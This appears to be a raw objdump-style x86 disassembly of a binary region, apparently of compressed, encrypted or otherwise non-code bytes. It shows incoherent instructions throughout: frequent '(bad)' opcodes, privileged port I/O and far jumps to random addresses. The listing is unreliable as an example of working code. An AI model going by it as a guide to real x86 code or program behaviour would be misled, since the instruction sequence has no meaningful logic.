  4257d2:	popf   
  4257d3:	sub    ebx,DWORD PTR ds:[esi+0x3c86dcef]
  4257da:	cli    
  4257db:	(bad)  
  4257dc:	xor    al,ch
  4257de:	fsubr  DWORD PTR ds:0x9c33fc01
  4257e4:	push   ecx
  4257e5:	sbb    al,0x7f
  4257e7:	sbb    DWORD PTR [edi],0x2a
  4257ea:	out    dx,al
  4257eb:	popa   
  4257ec:	icebp  
  4257ed:	test   al,0x1d
  4257ef:	dec    eax
  4257f0:	xor    eax,0x211fbaf1
  4257f5:	enter  0x60fd,0x7c
  4257f9:	mov    al,ds:0xdb3042f1
  4257fe:	mov    dl,0xe6
  425800:	adc    al,0x9a
  425802:	test   DWORD PTR [ebx],edx
  425804:	add    eax,0x94d0e303
  425809:	fcomp  DWORD PTR [edi-0x56]
  42580c:	shl    DWORD PTR [ecx-0x3b7bf580],0x85
  425813:	jecxz  0x4257ed
  425815:	retf   
  425816:	jb     0x4257a1
  425818:	jno    0x4257c1
  42581a:	fidiv  DWORD PTR ds:0xe4e2576c
  425820:	adc    al,0x97
  425822:	and    ah,BYTE PTR [eax+edx*8+0x5d82e122]
  425829:	dec    ebx
  42582a:	mov    edx,0x9972a70a
  42582f:	push   ebp
  425830:	repnz das 
  425832:	ret    
  425833:	jo     0x4257fc
  425835:	cwde   
  425836:	mov    ecx,0x960cc90f
  42583b:	(bad)  
  42583c:	jge    0x42588e
  42583e:	addr16 jmp 0x354ae846
  425844:	or     dh,bl
  425846:	adc    esi,DWORD PTR [ebx-0x1371fe0d]
  42584c:	nop
  42584d:	xor    al,0xba
  42584f:	outs   dx,DWORD PTR ds:[esi]
  425850:	popf   
  425851:	mov    esi,ebp
  425853:	pop    ds
  425854:	into   
  425855:	call   0xc3c9e53c
  42585a:	nop
  42585b:	rol    BYTE PTR [eax],0xcb
  42585e:	sahf   
  42585f:	in     al,0x87
  425861:	mov    al,0x41
  425863:	push   ebp
  425864:	mov    esi,0x3059a70c
  425869:	or     al,0xc3
  42586b:	mov    ch,0x1e
  42586d:	jne    0x425814
  42586f:	pop    ds
  425870:	arpl   WORD PTR [eax],sp
  425872:	lods   eax,DWORD PTR ds:[esi]
  425873:	sahf   
  425874:	test   eax,0x4307ffd6
  425879:	retf   0xf743
  42587c:	ds out 0xc7,al
  42587f:	(bad)  [ebp+ecx*1-0x3038cd72]
  425886:	cmp    esp,ebp
  425888:	and    eax,0x399331f0
  42588d:	inc    edi
  42588e:	xor    eax,0xb2fff4ae
  425893:	jns    0x425914
  425895:	mov    edi,0xa18eb6f6
  42589a:	fidiv  DWORD PTR [eax]
  42589c:	or     al,0x98
  42589e:	test   eax,0x772f36b0
  4258a3:	test   DWORD PTR [eax+0x52],edx
  4258a6:	lock sub ebp,DWORD PTR [esi-0xf7388cf]
  4258ad:	(bad)  
  4258af:	jbe    0x425896
  4258b1:	test   al,0x81
  4258b3:	jmp    0x425845
  4258b5:	shl    ebx,1
  4258b7:	not    DWORD PTR [ebx+0x4b]
  4258ba:	je     0x425921
  4258bc:	lods   eax,DWORD PTR ds:[esi]
  4258bd:	stc    
  4258be:	bound  esp,QWORD PTR [ecx+0x43]
  4258c1:	mov    ds:0x49376e19,eax
  4258c6:	test   eax,0x96f15938
  4258cb:	xor    eax,ebx
  4258cd:	push   ecx
  4258ce:	jge    0x4258b3
  4258d0:	xor    BYTE PTR [ebx+0x11164afc],bh
  4258d6:	loop   0x425873
  4258d8:	adc    al,0x2a
  4258da:	cmp    cl,bl
  4258dc:	sub    BYTE PTR [ecx+ebp*8-0x1ee640fd],ch
  4258e3:	nop
  4258e4:	mov    ds:0x14738cff,al
  4258e9:	lahf   
  4258ea:	pop    esi
  4258eb:	fsub   st(0),st
  4258ed:	pusha  
  4258ee:	xchg   edi,eax
  4258ef:	stos   BYTE PTR es:[edi],al
  4258f0:	mov    ecx,0x23712af7
  4258f5:	add    ebp,DWORD PTR [ecx]
  4258f7:	jmp    0x841c3b7d
  4258fc:	sbb    bl,bh
  4258fe:	adc    ecx,eax
  425900:	stc    
  425901:	mov    eax,ds:0x9295a9f3
  425906:	dec    eax
  425907:	js     0x42595a
  425909:	test   DWORD PTR [edi-0x54],edx
  42590c:	pop    eax
  42590d:	mov    BYTE PTR [eax-0x49598da2],dl
  425913:	aam    0xdb
  425915:	xchg   ebx,eax
  425916:	push   cs
  425917:	mov    DWORD PTR [esi],esp
  425919:	xchg   edi,eax
  42591a:	sbb    ebx,DWORD PTR [ebp+edx*8-0x76]
  42591e:	push   ds
  42591f:	cmc    
  425920:	mov    esi,ecx
  425922:	(bad)  
  425923:	arpl   si,ax
  425925:	pop    ebp
  425926:	dec    esi
  425927:	je     0x42590d
  425929:	sub    al,BYTE PTR [edi]
  42592b:	dec    esp
  42592c:	mov    WORD PTR [ecx-0x6b],fs
  42592f:	clc    
  425930:	xor    bh,BYTE PTR [edx+eiz*1-0x1333402d]
  425937:	test   DWORD PTR es:[eax+0x396749a0],ecx
  42593e:	push   edx
  42593f:	xchg   edi,eax
  425940:	and    DWORD PTR [edx+0x4f],esp
  425943:	xchg   DWORD PTR [edx-0x5c5334e2],ecx
  425949:	js     0x425966
  42594b:	pop    es
  42594c:	icebp  
  42594d:	leave  
  42594e:	jge    0x4259c4
  425950:	lahf   
  425951:	and    BYTE PTR [ebp+0xc],bl
  425954:	jb     0x42596f
  425956:	sbb    al,0x3e
  425958:	jge    0x42594d
  42595a:	mov    edx,0xe7f19da9
  42595f:	fadd   QWORD PTR [ecx]
  425961:	jle    0x42595d
  425963:	and    BYTE PTR [esi-0x76],al
  425966:	stos   BYTE PTR es:[edi],al
  425967:	rcr    BYTE PTR [eax],cl
  425969:	jp     0x4259aa
  42596b:	mov    eax,ds:0xcadebfa0
  425970:	loope  0x4259f0
  425972:	test   DWORD PTR [eax-0x1c],ebx
  425975:	mov    ebp,DWORD PTR [ecx+0x60]
  425978:	xlat   BYTE PTR ds:[ebx]
  425979:	shl    BYTE PTR [eax-0x25],cl
  42597c:	xchg   esi,eax
  42597d:	not    DWORD PTR [ebx]
  42597f:	daa    
  425980:	push   edx
  425982:	sub    ebp,edx
  425984:	dec    ecx
  425985:	xchg   ebp,eax
  425986:	or     esp,DWORD PTR [edx-0x3e]
  425989:	(bad)  
  42598a:	cmp    BYTE PTR [esi],al
  42598c:	loope  0x425963
  42598e:	out    0xc5,eax
  425990:	pop    edi
  425991:	je     0x4259fe
  425993:	push   0x35
  425995:	(bad)  
  425996:	int3   
  425997:	cdq    
  425998:	outs   dx,BYTE PTR ds:[esi]
  425999:	ins    BYTE PTR es:[edi],dx
  42599a:	xor    ch,0x7d
  42599d:	xchg   edx,eax
  42599e:	and    edi,DWORD PTR [esi]
  4259a0:	jb     0x425966
  4259a2:	mov    fs,WORD PTR [eax-0x75]
  4259a5:	jb     0x42597e
  4259a7:	mov    ebx,0xea057b41
  4259ac:	out    0x67,al
  4259ae:	mov    esi,ecx
  4259b0:	or     edx,DWORD PTR [ebx+esi*2]
  4259b3:	sbb    DWORD PTR [edi+0x8],ebx
  4259b6:	loop   0x425a2c
  4259b8:	jmp    0xd70faf74
  4259bd:	jmp    0x3179:0xf1fc4b58
  4259c4:	arpl   WORD PTR [ebp+ecx*2+0x2],di
  4259c8:	mov    ebp,0x1e74bc00
  4259cd:	mov    ds:0x7db3e3f0,eax
  4259d2:	retf   
  4259d3:	mov    BYTE PTR [eax+0x5a5f0d95],ah
  4259d9:	icebp  
  4259da:	stos   BYTE PTR es:[edi],al
  4259db:	cmp    BYTE PTR [edi+0x1f],dl
  4259de:	mov    esi,0xe4f717df
  4259e3:	aam    0x73
  4259e5:	mov    ds:0xb1f81fae,eax
  4259ea:	sahf   
  4259eb:	jge    0x4259fa
  4259ed:	(bad)  
  4259ee:	pop    ebx
  4259ef:	jo     0x425a57
  4259f1:	lea    ebx,ds:0xafc9026f
  4259f7:	loopne 0x4259b9
  4259f9:	mov    edx,0xcd49b51a
  4259fe:	mov    dh,0xa2
  425a00:	xlat   BYTE PTR fs:[ebx]
  425a02:	push   ss
  425a03:	cmp    al,0xec
  425a05:	test   al,0x6a
  425a07:	ins    BYTE PTR es:[edi],dx
  425a08:	cli    
  425a09:	push   ebx
  425a0a:	inc    eax
  425a0b:	mov    eax,ds:0x5a9493d7
  425a10:	push   ds
  425a11:	pusha  
  425a12:	dec    esp
  425a13:	xchg   DWORD PTR [edi],esp
  425a15:	arpl   WORD PTR [ecx+ecx*8-0x32],di
  425a19:	pop    ebx
  425a1a:	dec    ebx
  425a1b:	sar    DWORD PTR [ecx+0x2988dd62],1
  425a21:	adc    DWORD PTR [edx+0x5c8b0f0b],edx
  425a27:	pop    edi
  425a28:	inc    edi
  425a29:	sub    edi,DWORD PTR [ebp+0x51]
  425a2c:	sbb    esp,DWORD PTR [eax]
  425a2e:	mov    cl,0xcd
  425a30:	shl    BYTE PTR [edx],0x11
  425a33:	pushf  
  425a34:	xchg   edi,eax
  425a35:	arpl   WORD PTR [edx+ebx*8+0x2d],bp
  425a39:	mov    al,ds:0xd3a25a78
  425a3e:	stc    
  425a3f:	cmc    
  425a40:	jae    0x425a45
  425a42:	dec    edx
  425a43:	adc    DWORD PTR [ecx],eax
  425a45:	inc    ecx
  425a46:	(bad)  
  425a47:	(bad)  
  425a48:	jmp    0x3a865462
  425a4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a4e:	cld    
  425a4f:	pop    esp
  425a50:	dec    eax
  425a51:	leave  
  425a52:	test   DWORD PTR [edi],ebx
  425a54:	call   0x315a:0x912e1abe
  425a5b:	sbb    ebx,DWORD PTR [eax+0x3f]
  425a5e:	cld    
  425a5f:	and    eax,0x95000d8f
  425a64:	int3   
  425a65:	outs   dx,BYTE PTR ss:[esi]
  425a67:	mov    ebx,0x54d5a1ff
  425a6c:	dec    edx
  425a6d:	mov    bl,0x6b
  425a6f:	out    0x8b,al
  425a71:	adc    cl,cl
  425a73:	pop    esi
  425a74:	sub    al,0x4f
  425a76:	int3   
  425a77:	xor    bh,dh
  425a79:	test   al,0x0
  425a7b:	inc    ebx
  425a7c:	xor    eax,0xa177c04c
  425a81:	fimul  WORD PTR [edi]
  425a83:	popf   
  425a84:	test   DWORD PTR [eax+edi*2+0x595a64b7],esi
  425a8b:	stc    
  425a8c:	nop
  425a8d:	std    
  425a8e:	clc    
  425a8f:	jno    0x425a53
  425a91:	out    0xee,al
  425a93:	sbb    BYTE PTR [ebp+0x64cc9f75],ch
  425a99:	inc    ecx
  425a9a:	outs   dx,DWORD PTR ds:[esi]
  425a9b:	sbb    DWORD PTR [ebp-0x43d25e55],ebp
  425aa1:	imul   edi,DWORD PTR [ebp+0x6407ce27],0xe0ffabf6
  425aab:	inc    eax
  425aac:	pop    ebp
  425aad:	fs (bad) 
  425aaf:	jp     0x425ab4
  425ab1:	(bad)  
  425ab2:	mov    eax,ds:0xed43b17b
  425ab7:	and    esi,DWORD PTR [eax-0x344d643]
  425abd:	daa    
  425abe:	sar    BYTE PTR [ecx],cl
  425ac0:	adc    BYTE PTR [ecx],0xe3
  425ac3:	rcr    ch,1
  425ac5:	int    0xcf
  425ac7:	inc    esp
  425ac8:	cmp    eax,DWORD PTR [edi+edx*8-0x63]
  425acc:	arpl   WORD PTR [esp+edx*4-0x24],bp
  425ad0:	mov    ecx,0xb44f67b8
  425ad5:	in     al,dx
  425ad6:	popa   
  425ad7:	shl    DWORD PTR [edi+ebx*2-0x48],1
  425adb:	test   BYTE PTR fs:[ecx],dh
  425ade:	out    dx,eax
  425adf:	and    al,0x70
  425ae1:	lods   al,BYTE PTR ds:[esi]
  425ae2:	mov    eax,ds:0x99e1a716
  425ae7:	push   esi
  425ae8:	test   eax,0xcf070d45
  425aed:	adc    BYTE PTR [ebx+0xc053ede],0x96
  425af4:	call   0x88890661
  425af9:	push   edx
  425afa:	ror    DWORD PTR [ebx],cl
  425afc:	stos   BYTE PTR es:[edi],al
  425afd:	(bad)  
  425afe:	cmovl  esp,DWORD PTR [edi-0x78a375de]
  425b05:	mov    ebx,0xa8822b59
  425b0a:	int    0x6
  425b0c:	mov    WORD PTR [edx-0x40],gs
  425b0f:	mov    edx,0xb2b5f89f
  425b14:	jp     0x425b16
  425b16:	cwde   
  425b17:	cmp    al,bh
  425b19:	adc    ah,BYTE PTR [edi+0x4b]
  425b1c:	aas    
  425b1d:	jo     0x425b60
  425b1f:	or     BYTE PTR [ebx+0x26],bh
  425b22:	lods   al,BYTE PTR ds:[esi]
  425b23:	add    BYTE PTR [edx],dh
  425b25:	push   ds
  425b26:	out    0x3d,eax
  425b28:	data16 gs add al,0x6f
  425b2c:	dec    edi
  425b2d:	aaa    
  425b2e:	sbb    dh,BYTE PTR [edx+0x3fc48681]
  425b34:	nop
  425b35:	ja     0x425b83
  425b37:	out    0x1d,al
  425b39:	mov    edx,0xdebe903b
  425b3e:	dec    esi
  425b3f:	xchg   ecx,eax
  425b40:	shl    DWORD PTR [edi+0x396cb3a7],0x2e
  425b47:	add    cl,BYTE PTR [edi-0x11]
  425b4a:	mov    eax,ds:0x91ee5ebe
  425b4f:	sbb    BYTE PTR [esp+0x28],ch
  425b53:	cmc    
  425b54:	bound  ecx,QWORD PTR [ecx+0x5f]
  425b57:	stos   DWORD PTR es:[edi],eax
  425b58:	lea    esi,[edi-0x46]
  425b5b:	je     0x425b25
  425b5d:	mov    dh,0x5a
  425b5f:	shl    DWORD PTR [ebx+0x308fb9dd],0x81
  425b66:	(bad)  
  425b67:	mov    edx,0xf08ed738
  425b6c:	inc    edx
  425b6d:	or     ebp,DWORD PTR [eax]
  425b6f:	xchg   ebp,eax
  425b70:	test   DWORD PTR [ebx+eiz*8],0x7ca92ea4
  425b77:	add    edx,DWORD PTR [esi-0x2b]
  425b7a:	shl    DWORD PTR [ecx-0xf8e1842],cl
  425b80:	mov    ecx,0x2ece48fa
  425b85:	enter  0xfd8,0xa0
  425b89:	mov    WORD PTR [eax],gs
  425b8b:	mov    ah,0x5c
  425b8d:	rol    DWORD PTR [esi],0x4b
  425b90:	leave  
  425b91:	pmovmskb ecx,mm3
  425b94:	(bad)  
  425b95:	xchg   ebx,eax
  425b96:	retf   
  425b97:	scas   al,BYTE PTR es:[edi]
  425b98:	jmp    0xd310:0xd4bfecac
  425b9f:	fcomp  QWORD PTR [edi-0x13]
  425ba2:	push   0xfffffff2
  425ba4:	push   ebp
  425ba5:	mov    DWORD PTR [ebx-0x4a],ecx
  425ba8:	inc    eax
  425ba9:	(bad)  
  425bad:	rol    BYTE PTR [edi-0x4d17b9e9],cl
  425bb3:	iret   
  425bb4:	sub    edx,DWORD PTR [ebp-0x56]
  425bb7:	jb     0x425bfe
  425bb9:	mov    esp,0x5d1e36fd
  425bbe:	jbe    0x425b8a
  425bc0:	dec    ebx
  425bc1:	adc    ebp,DWORD PTR [ecx+eiz*4-0x9de0130]
  425bc8:	test   eax,0x6d8d6159
  425bcd:	and    al,0x63
  425bcf:	and    ch,BYTE PTR ds:0xd6ba14aa
  425bd5:	sub    bl,bl
  425bd7:	scas   al,BYTE PTR es:[edi]
  425bd8:	sbb    al,0xe1
  425bda:	inc    ebp
  425bdb:	hlt    
  425bdc:	(bad)  
  425bdd:	mov    dl,0xc9
  425bdf:	aas    
  425be0:	and    esi,0x68
  425be3:	push   ds
  425be4:	mov    al,0xe1
  425be6:	loopne 0x425bd4
  425be8:	jp     0x425c68
  425bea:	mov    esi,?
  425bec:	inc    esp
  425bed:	out    0x86,al
  425bef:	push   esp
  425bf0:	add    eax,ebx
  425bf2:	lahf   
  425bf3:	loope  0x425b9f
  425bf5:	(bad)  
  425bf6:	leave  
  425bf7:	call   0x951abcb6
  425bfc:	mov    eax,ds:0xe8262c81
  425c01:	mov    edi,0x993c0a04
  425c06:	cmp    al,0x8
  425c08:	mov    bl,0xd6
  425c0a:	add    eax,0xd1a6d9b9
  425c0f:	icebp  
  425c10:	or     BYTE PTR [ecx-0x18b0f169],dl
  425c16:	hlt    
  425c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c18:	or     BYTE PTR [edx],cl
  425c1a:	nop
  425c1b:	inc    edi
  425c1c:	pop    ebp
  425c1d:	sbb    ah,BYTE PTR [ecx-0x7507edd1]
  425c23:	and    DWORD PTR [edx],ebx
  425c25:	sub    eax,0x7758389e
  425c2a:	daa    
  425c2b:	in     eax,dx
  425c2c:	mov    edx,0x8065cfc0
  425c31:	inc    ebx
  425c32:	(bad)  
  425c33:	retf   
  425c34:	loop   0x425c33
  425c36:	call   0x9391:0xbfa2754b
  425c3d:	je     0x425c71
  425c3f:	xor    ebx,DWORD PTR [ecx+0x50561989]
  425c45:	mov    ch,BYTE PTR [ecx+0x2ff0c0e]
  425c4b:	push   edi
  425c4c:	gs mov ecx,0xa1ad6d8a
  425c52:	aad    0xf4
  425c54:	or     BYTE PTR [edi+0x1b],al
  425c57:	dec    ebx
  425c58:	inc    esp
  425c59:	fist   DWORD PTR [ecx]
  425c5b:	push   0x6d3ebb9a
  425c60:	mov    eax,0xb0e60af2
  425c65:	sar    eax,cl
  425c67:	retf   0x3288
  425c6a:	dec    ecx
  425c6b:	ins    DWORD PTR es:[edi],dx
  425c6c:	pop    ebp
  425c6d:	cmc    
  425c6e:	shl    DWORD PTR [ebx-0x774eb4fb],1
  425c74:	(bad)  
  425c75:	hlt    
  425c76:	add    bl,BYTE PTR [ecx-0x2ef28e05]
  425c7c:	jge    0x425cb9
  425c7e:	daa    
  425c7f:	xchg   ecx,eax
  425c80:	ret    
  425c81:	adc    al,0x22
  425c83:	shl    BYTE PTR [edi],1
  425c85:	inc    eax
  425c86:	add    cl,BYTE PTR [ebp+edx*4-0x2b]
  425c8a:	pop    eax
  425c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c8c:	push   ds
  425c8d:	mov    WORD PTR [eax],gs
  425c8f:	or     BYTE PTR [ebp-0x1],dh
  425c92:	mov    bl,0x11
  425c94:	mov    ah,0x9a
  425c96:	mov    cl,0x20
  425c98:	int    0x69
  425c9a:	push   edx
  425c9b:	cmp    eax,0x409a488f
  425ca0:	mov    dl,0x6
  425ca2:	push   edx
  425ca3:	das    
  425ca4:	in     al,0xd4
  425ca6:	ins    DWORD PTR es:[edi],dx
  425ca7:	clc    
  425ca8:	jge    0x425caf
  425caa:	xchg   ebp,eax
  425cab:	stos   DWORD PTR es:[edi],eax
  425cac:	mov    dl,0x31
  425cae:	fistp  QWORD PTR [eax+0x4200935b]
  425cb4:	xor    ch,BYTE PTR [eax]
  425cb6:	sbb    BYTE PTR [esi+edx*8+0xb4fe300],bl
  425cbd:	call   0x836e:0xdd26393d
  425cc4:	cli    
  425cc5:	rol    esi,cl
  425cc7:	jno    0x425c82
  425cc9:	pop    esi
  425cca:	clc    
  425ccb:	cld    
  425ccc:	mov    cl,0x6b
  425cce:	lea    esi,[edx+ecx*1+0x286c03c]
  425cd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425cd6:	jo     0x425c77
  425cd8:	shr    ebp,0x5e
  425cdb:	ror    BYTE PTR [edi],0xf8
  425cde:	popa   
  425cdf:	es mov al,0xe6
  425ce2:	(bad)  
  425ce4:	xor    BYTE PTR ds:0xa74b655b,dh
  425cea:	std    
  425ceb:	push   esi
  425cec:	inc    ebx
  425ced:	pop    ebp
  425cee:	das    
  425cef:	jmp    0x425caf
  425cf1:	and    eax,0xab43fa15
  425cf6:	in     al,dx
  425cf7:	sub    bh,dl
  425cf9:	pop    ss
  425cfa:	fistp  WORD PTR [edi]
  425cfc:	jmp    0x55ba225e
  425d01:	pop    ecx
  425d02:	frstor [ecx+0x1855e4a5]
  425d08:	add    DWORD PTR [edi+0x700f4785],edx
  425d0e:	or     BYTE PTR [edi],0x2d
  425d11:	xor    BYTE PTR [ecx],cl
  425d13:	(bad)  [eax+0x54d932fe]
  425d19:	sar    DWORD PTR [edx],cl
  425d1b:	and    BYTE PTR [edx-0x53],0xa
  425d1f:	stc    
  425d20:	sub    eax,0xda9c9fa8
  425d25:	jecxz  0x425d7d
  425d27:	out    dx,al
  425d28:	js     0x425d80
  425d2a:	push   0x3b
  425d2c:	xchg   BYTE PTR [ebp+ecx*8+0x4c283143],ah
  425d33:	retf   0x54fa
  425d36:	add    bl,BYTE PTR [edx-0x7a]
  425d39:	mov    esp,0xd5bdd720
  425d3e:	sub    edx,DWORD PTR [edi+0xcc34c55]
  425d44:	jle    0x425d91
  425d46:	out    dx,eax
  425d47:	retf   0xb637
  425d4a:	jecxz  0x425ceb
  425d4c:	adc    eax,0xc1ef581
  425d51:	sub    DWORD PTR [edx-0xf],esi
  425d54:	aam    0x6c
  425d56:	mov    DWORD PTR ss:[esi],edx
  425d59:	lods   al,BYTE PTR ds:[esi]
  425d5a:	push   ebp
  425d5b:	aaa    
  425d5c:	pop    ecx
  425d5d:	jmp    0x8068:0x5196f056
  425d64:	sub    eax,0x6be95fbb
  425d69:	popa   
  425d6a:	loopne 0x425d24
  425d6c:	fs pop esp
  425d6e:	jne    0x425dc8
  425d70:	mov    ecx,0xb53759d6
  425d75:	cld    
  425d76:	cmc    
  425d77:	(bad)  
  425d78:	test   eax,0xd3c1ef02
  425d7d:	ins    BYTE PTR es:[edi],dx
  425d7e:	hlt    
  425d7f:	test   eax,0x22d1e963
  425d84:	ja     0x425d56
  425d86:	add    eax,0x2a98c499
  425d8b:	es or  al,0x71
  425d8e:	cwde   
  425d8f:	clc    
  425d90:	das    
  425d91:	sub    dh,bl
  425d93:	inc    ebp
  425d94:	jno    0x425d96
	...
  425daa:	dec    edx
  425dab:	inc    ebx
  425dac:	push   ebp
  425dad:	push   esi
  425dae:	pop    ebp
  425daf:	push   esi
  425db0:	dec    ebx
  425db1:	pop    edi
  425db2:	idiv   bl
  425db4:	(bad)
  425db8:	cmp    eax,DWORD PTR [eax+eax*4]
  425dbb:	jmp    0x0:0x6d30001
  425dc2:	call   0x98f35904
  425dc7:	daa    
  425dc8:	add    DWORD PTR [ebp*1-0x143a9aa8],eax
  425dcf:	push   0xffffffd5
  425dd1:	scas   eax,DWORD PTR es:[edi]
  425dd2:	(bad)  
  425dd3:	dec    esi
  425dd4:	inc    edx
  425dd5:	mov    sp,0xdea6
  425dd9:	ror    al,cl
  425ddb:	lahf   
  425ddc:	int3   
  425ddd:	in     eax,dx
  425dde:	dec    eax
  425ddf:	(bad)  
  425de0:	jno    0x425d7e
  425de2:	xor    ecx,DWORD PTR [ebp+0x52]
  425de5:	push   esp
  425de6:	stos   BYTE PTR es:[edi],al
  425de7:	mov    ebp,0x2ec89446
  425dec:	shr    BYTE PTR [ecx],0xfa
  425def:	aaa    
  425df0:	push   eax
  425df1:	sti    
  425df2:	mov    bh,0x43
  425df4:	das    
  425df5:	dec    ebx
  425df6:	add    eax,0x3cf8d8fb
  425dfb:	pop    eax
  425dfc:	pop    edi
  425dfd:	jmp    0xf40128ae
  425e02:	shr    ch,0x9f
  425e05:	(bad)  
  425e06:	jmp    0x68d5:0xda27feea
  425e0d:	pop    ebx
  425e0e:	adc    BYTE PTR [ebx-0x1519d87f],cl
  425e14:	xchg   esi,eax
  425e15:	or     ebp,DWORD PTR [edx+edi*1-0x48]
  425e19:	out    dx,al
  425e1a:	popa   
  425e1b:	dec    ecx
  425e1c:	jecxz  0x425ddb
  425e1e:	cld    
  425e1f:	pop    esp
  425e20:	popf   
  425e21:	arpl   WORD PTR [ebx],ax
  425e23:	fiadd  WORD PTR [eax+0x4]
  425e26:	lods   al,BYTE PTR gs:[esi]
  425e28:	jnp    0x425dbf
  425e2a:	jbe    0x425e6e
  425e2c:	add    eax,ecx
  425e2e:	lds    ebp,FWORD PTR [esp+edi*4-0x3834904c]
  425e35:	cmp    ecx,edx
  425e37:	mov    ds:0x8748565a,eax
  425e3c:	or     BYTE PTR [eax-0x785c49e2],dh
  425e42:	sti    
  425e43:	mov    ds:0x4a6eedb0,eax
  425e48:	dec    edx
  425e49:	push   es
  425e4a:	mov    BYTE PTR [esp+ebp*8],bh
  425e4d:	cmp    BYTE PTR [esi],dh
  425e4f:	sub    BYTE PTR [ebp+0x7690a65b],bl
  425e55:	in     al,0x59
  425e57:	sub    BYTE PTR [eax+0x29],al
  425e5a:	sub    esp,esi
  425e5c:	inc    edi
  425e5d:	jp     0x425de0
  425e5f:	xchg   edx,eax
  425e60:	pop    ecx
  425e61:	xchg   BYTE PTR [esp+edx*8+0x132697f8],ch
  425e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e69:	sub    al,BYTE PTR [esi+0x6d]
  425e6c:	dec    edi
  425e6d:	and    BYTE PTR [ebp+0x41],al
  425e70:	inc    esi
  425e71:	push   esi
  425e72:	and    al,0x34
  425e74:	inc    edi
  425e75:	mov    ds:0xb4ab72d9,al
  425e7a:	ret    0xdef
  425e7d:	mov    edi,0xc9dfebbf
  425e82:	ss call 0x9199ecac
  425e88:	jp     0x425e8d
  425e8a:	dec    esi
  425e8b:	(bad)  
  425e8c:	pop    esp
  425e8d:	fwait
  425e8e:	xchg   esp,eax
  425e8f:	pop    edx
  425e90:	push   ss
  425e91:	cmp    BYTE PTR [eax+0x53],bh
  425e94:	sbb    ebp,esp
  425e96:	mov    bh,0xbc
  425e98:	mov    ecx,DWORD PTR [edi+0x6865cc21]
  425e9e:	jle    0x425e55
  425ea0:	and    al,0x3e
  425ea2:	dec    edi
  425ea3:	and    al,al
  425ea5:	pop    ecx
  425ea6:	xor    al,0x75
  425ea8:	(bad)  [edx-0x8]
  425eab:	pop    ds
  425eac:	adc    al,0xdc
  425eae:	jmp    0x1152:0xf4b62531
  425eb5:	into   
  425eb6:	out    0x6b,eax
  425eb8:	jmp    0xec7a067f
  425ebd:	scas   al,BYTE PTR es:[edi]
  425ebe:	mov    ebp,0x2c40b756
  425ec3:	sbb    eax,0x699c4e96
  425ec8:	not    DWORD PTR [esi+esi*8-0x1c2923a3]
  425ecf:	ja     0x425f46
  425ed1:	or     DWORD PTR [eax+0x3a],esi
  425ed4:	dec    edx
  425ed5:	ret    
  425ed6:	shr    BYTE PTR [eax],0x5b
  425ed9:	add    esi,eax
  425edb:	sar    DWORD PTR [ebx+0x498d0079],cl
  425ee1:	mov    ds:0xa7d8a5ac,al
  425ee6:	sti    
  425ee7:	cmp    bh,0x97
  425eea:	fs pop ds
  425eec:	dec    ebx
  425eed:	test   DWORD PTR [esi-0x1f],edi
  425ef0:	aam    0x2c
  425ef2:	in     al,0x77
  425ef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ef5:	stc    
  425ef6:	retf   0x1ff0
  425ef9:	scas   al,BYTE PTR es:[edi]
  425efa:	aaa    
  425efb:	rcr    DWORD PTR [eax+eax*4-0x4b3e0143],1
  425f02:	mov    ecx,0x520ad4cd
  425f07:	nop
  425f08:	js     0x425e8a
  425f0a:	push   0xffffffeb
  425f0c:	(bad)  
  425f0d:	sahf   
  425f0e:	imul   DWORD PTR [esi+ebp*2+0x7e]
  425f12:	mov    bh,0x2b
  425f14:	pop    eax
  425f15:	jbe    0x425e98
  425f17:	imul   ebx,DWORD PTR [esi-0x775baad1],0xd0999db2
  425f21:	mov    cl,0xf3
  425f23:	inc    esi
  425f24:	cmp    DWORD PTR [eax+0x57],0x1
  425f28:	xchg   ebx,eax
  425f29:	cli    
  425f2a:	mov    BYTE PTR [esp+eiz*2+0x1c13a808],bl
  425f31:	dec    esi
  425f32:	fs pushf 
  425f34:	fimul  DWORD PTR [eax+0x70]
  425f37:	jmp    0x425f7d
  425f39:	hlt    
  425f3a:	cwde   
  425f3b:	cmp    BYTE PTR [edi+0x6dd545a],bl
  425f41:	lds    ebx,FWORD PTR [edx]
  425f43:	fucomi st,st(0)
  425f45:	dec    ebx
  425f46:	or     eax,0xabcad590
  425f4b:	mov    ch,0xf7
  425f4d:	pop    esp
  425f4e:	or     BYTE PTR [edx+ebp*4-0x4bb9b182],dl
  425f55:	mov    dh,0x88
  425f57:	test   BYTE PTR [edi],0x4b
  425f5a:	jo     0x425f04
  425f5c:	push   0xd5fbf31b
  425f61:	aas    
  425f62:	inc    edx
  425f63:	add    BYTE PTR [eax+0x5e79deef],bl
  425f69:	arpl   bx,bp
  425f6b:	mov    eax,ds:0x1f5ae12a
  425f70:	ins    DWORD PTR es:[edi],dx
  425f71:	xchg   edx,eax
  425f72:	retf   
  425f73:	addr16 pop ecx
  425f75:	pusha  
  425f76:	sbb    al,0xa2
  425f78:	cmp    edx,DWORD PTR [ebp+0x3c]
  425f7b:	pop    edx
  425f7c:	les    esi,FWORD PTR [eax]
  425f7e:	scas   al,BYTE PTR es:[edi]
  425f7f:	add    bl,BYTE PTR [ebx-0xe]
  425f82:	jmp    0xb4ea:0xf413358e
  425f89:	inc    esi
  425f8a:	jg     0x425f94
  425f8c:	add    edi,edx
  425f8e:	add    eax,DWORD PTR ss:[esi+0x4b6a7318]
  425f95:	push   edi
  425f96:	(bad)  
  425f97:	xor    BYTE PTR [eax+0x30389c8a],cl
  425f9d:	xor    eax,0xe796f28a
  425fa2:	sbb    DWORD PTR [eax],0xaa28b6f0
  425fa8:	or     al,0x3
  425faa:	ss fs mov eax,0x2923e191
  425fb1:	shl    al,cl
  425fb3:	sub    BYTE PTR [edi],0x6b
  425fb6:	int    0x5a
  425fb8:	sbb    ebp,DWORD PTR [edi]
  425fba:	sbb    DWORD PTR ss:[ebp+0x3ed22b0f],ecx
  425fc1:	sub    al,0x2c
  425fc3:	pusha  
  425fc4:	out    0x1,eax
  425fc6:	cli    
  425fc7:	nop
  425fc8:	cmp    eax,0xdcdb11bc
  425fcd:	ret    0xd2f4
  425fd0:	push   0x14
  425fd2:	xor    eax,edx
  425fd4:	push   cs
